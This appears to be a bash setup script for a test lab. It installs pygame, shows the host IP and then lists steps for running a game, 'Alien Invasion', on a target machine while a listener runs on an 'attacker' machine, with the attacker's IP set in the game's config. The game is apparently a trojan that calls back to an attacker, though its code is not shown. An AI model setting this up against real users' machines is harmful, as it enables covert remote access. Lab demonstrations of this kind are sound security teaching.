#!/bin/bash
# Quick test setup script for Linux VMs

echo "=================================="
echo "Alien Invasion - Test Setup"
echo "=================================="
echo ""

# Check Python version
echo "Checking Python version..."
python3 --version

# Install dependencies
echo ""
echo "Installing dependencies..."
pip3 install pygame

# Get IP address
echo ""
echo "Your IP address:"
ip addr show | grep "inet " | grep -v 127.0.0.1

echo ""
echo "=================================="
echo "Setup complete!"
echo "=================================="
echo ""
echo "Next steps:"
echo "1. Update LISTENER_HOST in config.py with attacker's IP"
echo "2. On attacker machine: python3 listener.py"
echo "3. On target machine: python3 alien_invasion.py"
echo ""
